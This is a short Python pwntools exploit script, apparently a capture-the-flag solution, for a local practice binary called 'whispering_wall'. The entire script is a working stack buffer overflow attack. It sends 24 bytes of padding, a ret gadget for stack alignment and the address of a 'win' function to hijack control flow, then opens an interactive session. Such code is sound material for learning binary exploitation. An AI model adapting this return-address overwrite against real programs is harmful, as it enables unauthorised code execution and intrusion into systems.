#!usr/bin/env python3
from pwn import *

context.binary=elf=ELF("./whispering_wall",checksec=False)
p = process(elf.path)

offset_rip = 24
ret_align = 0x000000000040101a

win = elf.sym.win

p.recvuntil(b"whisper:")

payload = flat(
    b"A" * offset_rip,
    p64(ret_align),
    p64(win)
)
p.send(payload)
p.interactive()